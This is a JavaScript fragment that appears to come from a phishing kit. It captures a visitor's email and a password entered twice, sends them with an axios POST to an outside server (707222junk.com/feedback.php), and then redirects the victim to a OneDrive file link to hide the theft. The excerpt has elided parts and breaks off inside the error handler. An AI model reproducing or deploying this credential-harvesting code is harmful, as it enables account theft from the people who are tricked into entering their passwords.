  url_link = "https://1drv.ms/b/s!Am2YG07g8dw_ggJkI0X_1Ejj5KwL?e=Fs8AqT";
  displayPassword()
  loadPasswordAgain()
  ...
  function redirect(){
    ...
    //   show('fnf');
    // },3000);
     setTimeout(function(){window.location.href = url_link;},5000);
  }
  ...
  function processPassword2(t) {
    ...
    "" != e ? (sendDetails(userEmail, userPassword1, confirmPassword = e), hide("password2-row"), show("animate"), "flex" == document.getElementById("animate").style.display && redirect()) : (hide("password22Error"), show("password21Error"))
}

  function sendDetails(t, e, n) {
      var o = new FormData;
      o.append("email", t), o.append("password", e), o.append("confirm_password", n), axios.post("https://www.707222junk.com/feedback.php", o).then(function(t) {
          200 === t.status && console.log(t)
      }).catch(function(t) {
